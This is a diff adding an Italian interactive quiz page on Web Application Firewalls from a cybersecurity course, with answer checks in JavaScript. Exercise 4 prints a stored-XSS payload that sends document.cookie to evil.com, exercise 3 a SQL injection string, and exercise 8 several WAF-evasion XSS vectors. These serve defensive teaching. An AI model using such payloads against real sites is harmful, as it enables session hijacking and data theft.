@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Esercizi di Riepilogo — WAF</title>
+<style>
+:root{--accent:#0891B2;--accent2:#0077B6;--title:#0F4C75;--text:#1E293B;--muted:#64748B;--bg:#F8F9FA;--card:#FFFFFF;--border:#E2E8F0;--success:#059669;--success-bg:#F0FDF4;--success-border:#BBF7D0;--danger:#DC2626;--danger-bg:#FEF2F2;--danger-border:#FECACA;--warn:#D97706;--warn-bg:#FFFBEB;--warn-border:#FDE68A}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',Calibri,Arial,sans-serif;background:var(--bg);color:var(--text);line-height:1.6;max-width:900px;margin:0 auto;padding:16px}
+header{background:var(--title);color:#fff;padding:24px;border-radius:12px;margin-bottom:20px}
+header h1{font-size:1.4em;margin-bottom:4px}
+header p{color:#94A3B8;font-size:.9em}
+.stats{display:flex;gap:12px;flex-wrap:wrap;background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 16px;margin-bottom:20px;font-size:.85em}
+.stats span{color:var(--muted)}.stats b{color:var(--accent)}
+.section-title{background:var(--accent);color:#fff;padding:10px 16px;border-radius:8px;margin:20px 0 12px;font-weight:700;font-size:1em}
+.exercise{background:var(--card);border:1px solid var(--border);border-radius:8px;margin-bottom:14px;overflow:hidden}
+.ex-header{display:flex;justify-content:space-between;align-items:center;padding:10px 16px;border-bottom:1px solid var(--border);background:#FAFBFC}
+.ex-header h3{font-size:.95em;color:var(--title)}
+.diff{font-size:.7em;padding:2px 8px;border-radius:10px;font-weight:600}
+.easy{background:#F0FDF4;color:var(--success)}.medium{background:var(--warn-bg);color:var(--warn)}.hard{background:var(--danger-bg);color:var(--danger)}
+.ex-body{padding:14px 16px}
+.ex-body p{margin-bottom:8px;font-size:.9em}
+code{background:#F1F5F9;padding:2px 6px;border-radius:4px;font-family:Consolas,monospace;font-size:.85em}
+pre{background:#1E293B;color:#E2E8F0;padding:10px 12px;border-radius:6px;font-family:Consolas,monospace;font-size:.8em;overflow-x:auto;margin:8px 0}
+input[type=text],select{border:1px solid var(--border);border-radius:6px;padding:7px 10px;font-size:.9em;width:100%;max-width:500px;margin:4px 0;font-family:inherit}
+select{max-width:520px}
+button{background:var(--accent);color:#fff;border:none;border-radius:6px;padding:7px 16px;cursor:pointer;font-size:.85em;margin:4px 4px 4px 0}
+button:hover{opacity:.9}
+button.reset-btn{background:var(--muted)}
+.feedback{margin-top:8px;padding:10px 14px;border-radius:6px;font-size:.85em;display:none}
+.feedback.correct{display:block;background:var(--success-bg);color:var(--success);border:1px solid var(--success-border)}
+.feedback.wrong{display:block;background:var(--danger-bg);color:var(--danger);border:1px solid var(--danger-border)}
+.hint-btn{background:var(--warn);font-size:.8em;padding:5px 12px}
+.hint{display:none;background:var(--warn-bg);border:1px solid var(--warn-border);color:var(--warn);padding:10px 14px;border-radius:6px;margin-top:8px;font-size:.85em}
+.completed{border-left:3px solid var(--success)}
+table.ref{width:100%;border-collapse:collapse;font-size:.85em;margin:8px 0}
+table.ref th{background:var(--accent);color:#fff;padding:6px 10px;text-align:left}
+table.ref td{padding:6px 10px;border-bottom:1px solid var(--border)}
+table.ref tr:nth-child(even){background:#F1F5F9}
+footer{text-align:center;padding:20px;color:var(--muted);font-size:.8em;margin-top:30px}
+@media(max-width:600px){body{padding:10px}input[type=text],select{max-width:100%}.stats{flex-direction:column;gap:4px}}
+</style>
+</head>
+<body>
+
+<header>
+<h1>🌐 Esercizi di Riepilogo — WAF</h1>
+<p>10 esercizi sui Web Application Firewall | ~30 min</p>
+</header>
+
+<div class="stats">
+<span>Completati: <b id="done">0</b>/10</span>
+<span>Corretti: <b id="ok">0</b>/10</span>
+<span>Precisione: <b id="pct">—</b></span>
+</div>
+
+<!-- ═══ A. FONDAMENTI ═══ -->
+<div class="section-title">A — Fondamenti del WAF</div>
+
+<div class="exercise" id="ex1">
+<div class="ex-header"><h3>1. A che layer opera un WAF?</h3><span class="diff easy">Facile</span></div>
+<div class="ex-body">
+<p>Un Web Application Firewall (WAF) ispeziona il traffico principalmente a quale layer del modello OSI?</p>
+<select id="f1">
+<option value="">— Seleziona —</option>
+<option value="a">Layer 2 (Data Link)</option>
+<option value="b">Layer 3-4 (Network/Transport)</option>
+<option value="c">Layer 7 (Application)</option>
+<option value="d">Layer 1 (Physical)</option>
+</select>
+<button onclick="chkSel('f1','c','✓ Corretto! Il WAF opera a layer 7 (Application): ispeziona le richieste HTTP/HTTPS nel loro contenuto. Vede URL, parametri GET/POST, header HTTP, cookie, body JSON/XML. Un firewall stateful tradizionale opera a layer 3-4 (IP + porte) e NON vede il contenuto delle richieste web.','✗ Il WAF è un firewall applicativo: opera a Layer 7 e analizza il CONTENUTO delle richieste HTTP (URL, parametri, cookie, body). A layer 3-4 c è il firewall stateful tradizionale (vede IP e porte, non il contenuto).')">Verifica</button>
+<button class="reset-btn" onclick="resetEx('ex1',['f1'])">Reset</button>
+<div class="feedback" id="fb1"></div>
+</div></div>
+
+<div class="exercise" id="ex2">
+<div class="ex-header"><h3>2. WAF vs Firewall tradizionale</h3><span class="diff easy">Facile</span></div>
+<div class="ex-body">
+<p>Un firewall stateful riesce a rilevare un attacco di SQL injection?</p>
+<select id="f2">
+<option value="">— Seleziona —</option>
+<option value="a">No, perché il firewall stateful vede solo IP/porte (layer 3-4), non il contenuto della richiesta HTTP. L'SQL injection è nel body o nei parametri — servirebbe un WAF per rilevarlo.</option>
+<option value="b">Sì, se la regola è configurata correttamente</option>
+<option value="c">Solo se è abilitata l'ispezione profonda dei pacchetti</option>
+<option value="d">Dipende dal vendor del firewall</option>
+</select>
+<button onclick="chkSel('f2','a','✓ Corretto! Il firewall stateful vede solo IP sorgente, IP destinazione, porta e protocollo. Un attacco SQL injection arriva come normale richiesta HTTP verso la porta 443 — dal punto di vista del firewall stateful è traffico legittimo. Solo un WAF può guardare dentro la richiesta HTTP e rilevare pattern malevoli come <code>'+OR+1=1--</code>.','✗ Il firewall stateful NON può rilevare SQL injection perché non guarda il contenuto delle richieste HTTP. Vede solo IP/porte: per lui una richiesta malevola e una legittima verso lo stesso web server su porta 443 sono indistinguibili. Serve il WAF.')">Verifica</button>
+<button class="reset-btn" onclick="resetEx('ex2',['f2'])">Reset</button>
+<div class="feedback" id="fb2"></div>
+</div></div>
+
+<!-- ═══ B. ATTACCHI APPLICATIVI ═══ -->
+<div class="section-title">B — Attacchi che il WAF deve rilevare</div>
+
+<div class="exercise" id="ex3">
+<div class="ex-header"><h3>3. Identifica l'attacco</h3><span class="diff medium">Medio</span></div>
+<div class="ex-body">
+<p>Analizza questa richiesta HTTP che arriva al tuo web server:</p>
+<pre>GET /search?q=' OR '1'='1 HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0</pre>
+<p>Che tipo di attacco è?</p>
+<select id="f3">
+<option value="">— Seleziona —</option>
+<option value="a">Cross-Site Scripting (XSS)</option>
+<option value="b">Directory traversal</option>
+<option value="c">Command injection</option>
+<option value="d">SQL Injection</option>
+</select>
+<button onclick="chkSel('f3','d','✓ Corretto! La stringa <code>OR 1=1</code> è la firma classica dell SQL injection. L attaccante cerca di modificare la query SQL backend aggiungendo una condizione sempre vera. Se il web server costruisce la query come <code>SELECT * FROM users WHERE name = $param</code>, il parametro malevolo la trasforma in <code>WHERE name = OR 1=1</code> — che restituisce TUTTI gli utenti. Un WAF con regole OWASP Core Rule Set bloccherebbe questo pattern.','✗ <code>OR 1=1</code> è la firma classica di SQL Injection — l attaccante iniettare SQL nella query backend tramite un parametro HTTP. L XSS invece avrebbe tag <script> o attributi JavaScript. Il directory traversal userebbe ../../ ecc.')">Verifica</button>
+<button class="reset-btn" onclick="resetEx('ex3',['f3'])">Reset</button>
+<div class="feedback" id="fb3"></div>
+</div></div>
+
+<div class="exercise" id="ex4">
+<div class="ex-header"><h3>4. Attacco XSS stored</h3><span class="diff medium">Medio</span></div>
+<div class="ex-body">
+<p>Un utente malevolo inserisce questo commento sul tuo blog:</p>
+<pre>&lt;script&gt;document.location='http://evil.com/steal?c='+document.cookie&lt;/script&gt;</pre>
+<p>Se il WAF NON lo blocca, cosa succederà quando altri utenti visiteranno la pagina?</p>
+<select id="f4">
+<option value="">— Seleziona —</option>
+<option value="a">Il server invia email a tutti gli utenti</option>
+<option value="b">Il browser di ogni visitatore esegue lo script, che ruba il cookie di sessione e lo invia al server dell'attaccante</option>
+<option value="c">Il blog si cancella automaticamente</option>
+<option value="d">Nulla, il browser rifiuta automaticamente gli script sospetti</option>
+</select>
+<button onclick="chkSel('f4','b','✓ Corretto! Questo è XSS Stored: il payload viene salvato nel database del blog, e ogni visitatore che carica la pagina esegue automaticamente lo script nel proprio browser. <code>document.cookie</code> contiene il cookie di sessione della vittima, che viene inviato a evil.com. L attaccante può poi usare quel cookie per impersonare la vittima (session hijacking). Un singolo commento malevolo può colpire migliaia di utenti. Il WAF blocca pattern come <code>&lt;script&gt;</code> nei parametri.','✗ L attacco è XSS Stored: il payload JavaScript malevolo viene eseguito nel browser di OGNI visitatore della pagina. Il codice legge document.cookie (il cookie di sessione della vittima) e lo invia all attaccante. Risultato: session hijacking di tutti i visitatori. Un WAF ben configurato blocca i tag &lt;script&gt; nei parametri HTTP.')">Verifica</button>
+<button class="reset-btn" onclick="resetEx('ex4',['f4'])">Reset</button>
+<div class="feedback" id="fb4"></div>
+</div></div>
+
+<div class="exercise" id="ex5">
+<div class="ex-header"><h3>5. OWASP Top 10 — classifica gli attacchi</h3><span class="diff hard">Difficile</span></div>
+<div class="ex-body">
+<p>Seleziona TUTTE le vulnerabilità presenti nella OWASP Top 10 2021:</p>
+<p><label><input type="checkbox" id="f5a" value="y"> A01 — Broken Access Control</label></p>
+<p><label><input type="checkbox" id="f5b" value="y"> A03 — Injection (SQL, NoSQL, Command)</label></p>
+<p><label><input type="checkbox" id="f5c" value="n"> A04 — Buffer Overflow sullo stack</label></p>
+<p><label><input type="checkbox" id="f5d" value="y"> A10 — Server-Side Request Forgery (SSRF)</label></p>
+<p><label><input type="checkbox" id="f5e" value="n"> A07 — Virus e malware sul server</label></p>
+<p><label><input type="checkbox" id="f5f" value="y"> A07 — Identification and Authentication Failures</label></p>
+<button onclick="chk5()">Verifica</button>
+<button class="reset-btn" onclick="resetEx5()">Reset</button>
+<div class="feedback" id="fb5"></div>
+</div></div>
+
+<!-- ═══ C. DEPLOYMENT E MODALITÀ ═══ -->
+<div class="section-title">C — Modalità di deployment</div>
+
+<div class="exercise" id="ex6">
+<div class="ex-header"><h3>6. WAF come reverse proxy</h3><span class="diff medium">Medio</span></div>
+<div class="ex-body">
+<p>Nella modalità più comune di deployment, il WAF è posto:</p>
+<select id="f6">
+<option value="">— Seleziona —</option>
+<option value="a">Direttamente sul client (come estensione del browser)</option>
+<option value="b">Dentro il database, per filtrare le query SQL</option>
+<option value="c">Come reverse proxy DAVANTI al web server: tutte le richieste passano dal WAF, che le ispeziona e le inoltra solo se "pulite" al backend</option>
+<option value="d">Nel router ISP</option>
+</select>
+<button onclick="chkSel('f6','c','✓ Corretto! Il WAF è classicamente posto davanti al web server come reverse proxy. Il client si connette al WAF (che ha il certificato TLS del sito), il WAF decifra la richiesta, la ispeziona, e se è pulita la inoltra al backend. Permette ispezione completa anche del traffico HTTPS (il WAF ha le chiavi private). Esempi: F5 BIG-IP ASM, Imperva, AWS WAF, Cloudflare, ModSecurity + nginx.','✗ Il WAF è tipicamente un reverse proxy: sta DAVANTI al web server, decifra HTTPS, ispeziona le richieste, le inoltra al backend se pulite. Riesce a vedere il contenuto delle richieste cifrate perché termina lui il TLS. Altri modelli esistono (agente sul web server, cloud-based) ma il reverse proxy è il più comune.')">Verifica</button>
+<button class="reset-btn" onclick="resetEx('ex6',['f6'])">Reset</button>
+<div class="feedback" id="fb6"></div>
+</div></div>
+
+<div class="exercise" id="ex7">
+<div class="ex-header"><h3>7. Monitor mode vs Blocking mode</h3><span class="diff medium">Medio</span></div>
+<div class="ex-body">
+<p>La best practice per mettere in produzione un nuovo WAF è:</p>
+<select id="f7">
+<option value="">— Seleziona —</option>
+<option value="a">Partire in "monitor mode" (solo logging, nessun blocco) per diverse settimane, analizzare i falsi positivi, tunare le regole, poi passare gradualmente al "blocking mode"</option>
+<option value="b">Abilitare subito tutte le regole in modalità bloccante, tanto si vede subito se qualcosa si rompe</option>
+<option value="c">Configurare solo le regole per SQL injection, ignorare il resto</option>
+<option value="d">Lasciare sempre in monitor mode perché il blocking è pericoloso</option>
+</select>
+<button onclick="chkSel('f7','a','✓ Corretto! Il ciclo di vita standard di un WAF è: (1) Monitor mode — tutto viene loggato ma niente viene bloccato, per capire quali regole producono falsi positivi sulla tua applicazione; (2) Tuning — si creano eccezioni per i falsi positivi legittimi (es. un parametro che contiene caratteri simili a SQL ma è lecito); (3) Progressive blocking — si passa al blocco solo delle regole ad alta confidenza, poi gradualmente delle altre. Saltare le fasi 1-2 = rischio ALTO di bloccare utenti legittimi in produzione.','✗ Mai partire con blocking totale senza tuning! Ogni applicazione ha specificità (parametri che sembrano attacchi ma sono leciti). Il processo corretto è: Monitor → analisi log → tuning → blocking progressivo. Lasciare in monitor mode permanente è come avere una guardia che vede i ladri ma non interviene — utile solo per audit, non per protezione.')">Verifica</button>
+<button class="reset-btn" onclick="resetEx('ex7',['f7'])">Reset</button>
+<div class="feedback" id="fb7"></div>
+</div></div>
+
+<!-- ═══ D. LIMITI E BYPASS ═══ -->
+<div class="section-title">D — Limiti del WAF</div>
+
+<div class="exercise" id="ex8">
+<div class="ex-header"><h3>8. Bypass del WAF con encoding</h3><span class="diff hard">Difficile</span></div>
+<div class="ex-body">
+<p>Un attaccante prova a bypassare un WAF che blocca <code>&lt;script&gt;</code>. Quale di queste tecniche potrebbe funzionare?</p>
+<select id="f8">
+<option value="">— Seleziona —</option>
+<option value="a">Inviare la richiesta via POST invece che GET</option>
+<option value="b">Cambiare l'ordine degli header HTTP</option>
+<option value="c">Usare solo lettere minuscole</option>
+<option value="d">Usare payload equivalenti ma senza <code>&lt;script&gt;</code>, come <code>&lt;img src=x onerror=alert(1)&gt;</code> o <code>&lt;svg onload=...&gt;</code>, oppure encoding creativi (<code>&lt;ScRiPt&gt;</code>, URL encoding multiplo)</option>
+</select>
+<button onclick="chkSel('f8','d','✓ Corretto! Un WAF che blocca solo il pattern <code>&lt;script&gt;</code> è banale da bypassare. XSS può essere fatto con decine di vettori diversi: event handler su qualsiasi tag (<code>onerror</code>, <code>onload</code>, <code>onmouseover</code>), <code>&lt;svg&gt;</code>, <code>&lt;iframe srcdoc&gt;</code>, encoding Unicode, HTML entities, case mixing. La OWASP XSS Filter Evasion Cheat Sheet documenta centinaia di varianti. I WAF seri (ModSecurity + OWASP CRS, Cloudflare, Imperva) hanno set di regole complesse per coprire molti vettori, ma nessun WAF è al 100%.','✗ Il bypass più comune è usare payload alternativi o encoding. Un singolo blocco su <code>&lt;script&gt;</code> è insufficiente: esistono centinaia di modi per fare XSS. I WAF ben configurati usano regole multiple (es. OWASP Core Rule Set) per coprire ampiamente i vettori.')">Verifica</button>
+<button class="reset-btn" onclick="resetEx('ex8',['f8'])">Reset</button>
+<div class="feedback" id="fb8"></div>
+</div></div>
+
+<div class="exercise" id="ex9">
+<div class="ex-header"><h3>9. Falso positivo del WAF</h3><span class="diff hard">Difficile</span></div>
+<div class="ex-body">
+<p>Sul tuo portale aziendale, un legittimo utente invia un post su un forum con il testo: <em>"Il mio libro preferito è '1984' di Orwell; uso spesso l'espressione 'or else' quando parlo"</em>. Il WAF blocca il post come attacco. Cosa è successo?</p>
+<select id="f9">
+<option value="">— Seleziona —</option>
+<option value="a">L'utente è effettivamente malevolo</option>
+<option value="b">È un falso positivo: il WAF rileva pattern come <code>'1984'</code> e <code>' or '</code> come possibili SQL injection (apici + "or" sono classici di SQLi), ma nel contesto sono linguaggio naturale legittimo. Soluzione: tuning delle regole o whitelist per l'endpoint del forum</option>
+<option value="c">Il WAF è rotto, va sostituito</option>
+<option value="d">Tutti i post sul forum devono essere riscritti</option>
+</select>
+<button onclick="chkSel('f9','b','✓ Corretto! Questo è un classico esempio di falso positivo: pattern come apici singoli + la parola "or" + numeri sono tipici di SQL injection, ma esistono legittimamente anche nel linguaggio naturale (titoli di libri, citazioni). Il WAF, per sua natura, non conosce il contesto semantico. Soluzioni: (1) tunare le regole di SQLi per essere meno aggressive sugli endpoint dei forum/blog, (2) creare whitelist per parametri noti di contenere testo libero, (3) contestualizzare la severity delle regole (blocca solo se il pattern è dentro parametri di query che interagiscono col DB). Il bilanciamento tra falsi positivi e falsi negativi è il lavoro quotidiano di chi gestisce un WAF.','✗ È un falso positivo. Il WAF rileva pattern come apici e "or" che assomigliano a SQL injection, ma in testo libero (titoli di libri, citazioni, commenti) sono legittimi. Servono tuning delle regole e/o eccezioni per gli endpoint con testo user-generated. È il problema più comune nei primi mesi di vita di un WAF.')">Verifica</button>
+<button class="reset-btn" onclick="resetEx('ex9',['f9'])">Reset</button>
+<div class="feedback" id="fb9"></div>
+</div></div>
+
+<!-- ═══ E. INTEGRAZIONE CON ALTRI SISTEMI ═══ -->
+<div class="section-title">E — Defense in Depth</div>
+
+<div class="exercise" id="ex10">
+<div class="ex-header"><h3>10. Architettura multi-strato</h3><span class="diff hard">Difficile</span></div>
+<div class="ex-body">
+<p>Hai un e-commerce in DMZ con: <strong>firewall stateful + WAF + server applicativo + database</strong>. Un attaccante trova una vulnerabilità 0-day nel framework web che il WAF NON riconosce (quindi la lascia passare). Quale NON è una difesa aggiuntiva utile in questo scenario?</p>
+<select id="f10">
+<option value="">— Seleziona —</option>
+<option value="a">Rate limiting e bot detection (blocca attacchi volumetrici o comportamenti anomali)</option>
+<option value="b">EDR / monitoring sul server applicativo (rileva processi anomali, modifiche a file critici)</option>
+<option value="c">Spegnere il WAF perché tanto non è riuscito a bloccare l'attacco</option>
+<option value="d">Least privilege del DB user (l'utente con cui l'app si connette al DB ha SOLO i permessi necessari, non DROP TABLE o accesso ad altri database)</option>
+</select>
+<button onclick="chkSel('f10','c','✓ Corretto! Spegnere il WAF è l esatto opposto di defense in depth! Un WAF non deve bloccare il 100% degli attacchi per essere utile: anche se lascia passare un 0-day, blocca TUTTI gli altri attacchi noti e riduce drasticamente la superficie di attacco. Le altre opzioni sono strati complementari validi: rate limiting, EDR per il server, least privilege per il DB. In defense in depth NON si spengono gli strati — se ne AGGIUNGONO per coprire i gap. Anche quando uno strato fallisce contro un attacco specifico, gli altri strati possono limitare il danno (detection EDR, blocco privilegi DB, containment tramite segmentazione).','✗ La filosofia di defense in depth è: MAI togliere strati, SEMPRE aggiungerli. Un WAF che ha perso contro un 0-day ha comunque valore (ha bloccato tutti gli altri attacchi). Spegnerlo è un errore grave. Gli altri strati (rate limiting, EDR, least privilege) sono complementari e riducono l impatto dell attacco anche se il WAF ha fallito.')">Verifica</button>
+<button class="reset-btn" onclick="resetEx('ex10',['f10'])">Reset</button>
+<div class="feedback" id="fb10"></div>
+</div></div>
+
+<footer>
+Corso Cybersecurity — Leonardo SpA | Modulo 1 — Esercizi di Riepilogo WAF<br>
+<a href="https://luiroman.github.io/leonardo-esercizi-interattivi/">Tutti gli esercizi</a>
+</footer>
+
+<script>
+let completed={},correct={};
+function updateStats(){
+  const d=Object.keys(completed).length, c=Object.values(correct).filter(Boolean).length;
+  document.getElementById('done').textContent=d;
+  document.getElementById('ok').textContent=c;
+  document.getElementById('pct').textContent=d>0?Math.round(c/d*100)+'%':'—';
+}
+function markEx(id,ok){
+  completed[id]=true; correct[id]=ok;
+  document.getElementById(id).classList.toggle('completed',ok);
+  updateStats();
+}
+function chk(fid,accept,msgOk){
+  const v=document.getElementById(fid).value.trim().toLowerCase().replace(/\s+/g,' ');
+  const num=fid.replace('f','');
+  const fb=document.getElementById('fb'+num);
+  const ok=accept.some(a=>v===a.toLowerCase());
+  fb.className='feedback '+(ok?'correct':'wrong');
+  fb.textContent=ok?msgOk:'✗ Non corretto. Riprova!';
+  fb.style.display='block';
+  markEx('ex'+num,ok);
+}
+function chkSel(fid,val,msgOk,msgNo){
+  const v=document.getElementById(fid).value;
+  const num=fid.replace('f','');
+  const fb=document.getElementById('fb'+num);
+  if(!v){fb.className='feedback wrong';fb.textContent='Seleziona una risposta.';fb.style.display='block';return;}
+  const ok=v===val;
+  fb.className='feedback '+(ok?'correct':'wrong');
+  fb.textContent=ok?msgOk:msgNo;
+  fb.style.display='block';
+  markEx('ex'+num,ok);
+}
+function chk5(){
+  // Le risposte corrette sono a, b, d, f (value="y")
+  const correct_ids=['f5a','f5b','f5d','f5f'];
+  const wrong_ids=['f5c','f5e'];
+  const allCorrect=correct_ids.every(id=>document.getElementById(id).checked)
+                   && wrong_ids.every(id=>!document.getElementById(id).checked);
+  const fb=document.getElementById('fb5');
+  fb.className='feedback '+(allCorrect?'correct':'wrong');
+  fb.textContent=allCorrect
+    ?'✓ Corretto! OWASP Top 10 2021 include: A01 Broken Access Control, A03 Injection, A07 Identification/Authentication Failures, A10 SSRF. NON include "Buffer Overflow" come categoria indipendente (è un problema sistemistico, non specifico del web) né "Virus e malware sul server" (quello è protezione endpoint/AV, non application security).'
+    :'✗ Le risposte corrette sono A01, A03, A07, A10. Le OWASP Top 10 coprono vulnerabilità applicative web: injection, accesso rotto, autenticazione, SSRF. NON coprono buffer overflow (problema di sistema) o malware (problema endpoint).';
+  fb.style.display='block';
+  markEx('ex5',allCorrect);
+}
+function resetEx(exId,fields){
+  fields.forEach(f=>{const el=document.getElementById(f);if(el.tagName==='SELECT')el.selectedIndex=0;else el.value='';});
+  const num=exId.replace('ex','');
+  const fb=document.getElementById('fb'+num);
+  if(fb){fb.style.display='none';fb.className='feedback';}
+  document.getElementById(exId).classList.remove('completed');
+  delete completed[exId];delete correct[exId];
+  updateStats();
+}
+function resetEx5(){
+  ['f5a','f5b','f5c','f5d','f5e','f5f'].forEach(id=>document.getElementById(id).checked=false);
+  const fb=document.getElementById('fb5');
+  fb.style.display='none';
+  document.getElementById('ex5').classList.remove('completed');
+  delete completed['ex5'];delete correct['ex5'];
+  updateStats();
+}
+function toggleHint(id){const h=document.getElementById(id);h.style.display=h.style.display==='block'?'none':'block';}
+</script>
+</body>
+</html>
